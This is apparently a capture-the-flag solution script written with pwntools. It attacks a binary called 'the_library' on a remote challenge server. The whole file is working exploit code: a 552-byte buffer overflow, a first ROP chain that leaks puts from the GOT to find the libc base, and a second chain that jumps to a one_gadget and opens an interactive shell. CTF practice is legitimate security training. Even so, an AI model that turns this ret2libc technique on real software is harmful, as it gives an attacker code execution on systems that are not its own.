# the-library
from pwn import *
filename = "the_library"
libc = "libc-2.31.so" 
elf = context.binary = ELF(filename)
libc = ELF(libc)


f = open("exploit_raw", "wb")

pop_rsi_r15     = 0x401491
pop_rdi         = 0x401493
pop_r12_r13_r14_r15 = 0x40148c

main = elf.sym.main

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    if args.REMOTE:
        return remote("challenge.ctf.games", 30054)
    else:
        return process(elf.path)

io = start()

# Start

ropchain = b"A" * 552
ropchain += p64(pop_rdi)
ropchain += p64(elf.got['puts'])
ropchain += p64(elf.plt['puts'])
ropchain += p64(elf.symbols['_start'])

f.write(ropchain)

io.recv() # Cleaning stdout buffer

io.sendline(ropchain) 
leaked_puts = io.recv()[9:15] # Get puts@plt leak
leaked_puts = u64(leaked_puts.ljust(8, b"\x00"))
log.info(f"puts@plt leaked :: {hex(leaked_puts)}")

libc.address = leaked_puts - libc.sym.puts

log.info(f"libc base address :: {hex(libc.address)}")


bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym.system
exit = libc.sym.exit

log.info(f"/bin/sh address :: {hex(bin_sh)}")
log.info(f"system address :: {hex(system)}")


one_gadget = libc.address + 0xe6c7e


io.clean()

ropchain = b"A"*552
ropchain += p64(pop_r12_r13_r14_r15)
ropchain += p64(0)
ropchain += p64(0)
ropchain += p64(0)
ropchain += p64(0)
ropchain += p64(one_gadget)
ropchain += b"\x00"*100
io.sendline(ropchain)


# End

io.interactive()
